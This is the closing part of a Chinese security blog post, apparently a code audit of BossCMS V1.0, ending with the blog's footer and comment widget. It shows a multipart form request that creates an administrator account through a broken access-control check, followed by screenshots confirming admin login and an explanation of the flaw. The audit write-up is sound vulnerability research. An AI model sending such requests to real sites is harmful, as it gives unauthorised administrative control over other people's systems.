+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;password&quot;
+
+123
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;passwords&quot;
+
+123
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;level&quot;
+
+2
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;department&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;open&quot;
+
+1
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;permit1&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;permit2&quot;
+
+[&quot;content&amp;content&quot;,&quot;items&amp;items&quot;,&quot;banner&amp;banner&quot;,&quot;consult&amp;consult&quot;,&quot;feedback&amp;feedback&quot;,&quot;search&amp;search&quot;,&quot;seo&amp;seo&quot;,&quot;seo&amp;violation&quot;,&quot;seo&amp;rewrite&quot;,&quot;anchor&amp;anchor&quot;,&quot;link&amp;link&quot;,&quot;plugin&amp;plugin&quot;,&quot;plugin&amp;market&quot;,&quot;template&amp;template&quot;,&quot;template&amp;market&quot;,&quot;store&amp;store&quot;,&quot;manager&amp;manager&quot;,&quot;safe&amp;safe&quot;,&quot;safe&amp;backup&quot;,&quot;site&amp;site&quot;,&quot;site&amp;email&quot;,&quot;site&amp;sms&quot;,&quot;site&amp;code&quot;,&quot;menu&amp;menu&quot;,&quot;language&amp;language&quot;,&quot;site&amp;state&quot;]
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;permit3&quot;
+
+[&quot;content&amp;content&quot;,&quot;items&amp;items&quot;,&quot;banner&amp;banner&quot;,&quot;consult&amp;consult&quot;,&quot;feedback&amp;feedback&quot;,&quot;search&amp;search&quot;,&quot;plugin&amp;plugin&quot;,&quot;safe&amp;backup&quot;,&quot;site&amp;site&quot;,&quot;site&amp;code&quot;,&quot;menu&amp;menu&quot;,&quot;language&amp;language&quot;,&quot;site&amp;state&quot;]
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;permit4&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;image&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;alias&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;email&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy
+Content-Disposition: form-data; name=&quot;phone&quot;
+
+
+------WebKitFormBoundaryB067fgIWBKtHI4Gy--
+
+</code></pre>
+<p>成功添加管理员用户</p>
+<figure data-type="image" tabindex="46"><img src="https://img-blog.csdnimg.cn/img_convert/88271834f9e14e12b0a633a03aee690f.png" alt="image-20211229083307484" loading="lazy"></figure>
+<p>成功登录，且为管理员权限</p>
+<figure data-type="image" tabindex="47"><img src="https://img-blog.csdnimg.cn/img_convert/ca52ef2832f837f82e750c8efafd458f.png" alt="image-20211229083824977" loading="lazy"></figure>
+<h3 id="后记">后记</h3>
+<p>都是一些简单常见的漏洞点，主要还是一个跳转之后未及时结束程序导致访问控制体系崩塌，后台变前台</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/classcms24-dai-ma-shen-ji/" class="post-title gt-a-link">
+                    ClassCMS2.4代码审计
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/bosscmsv10-dai-ma-shen-ji/" class="leancloud_visitors" data-flag-title="BossCMSV1.0代码审计">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
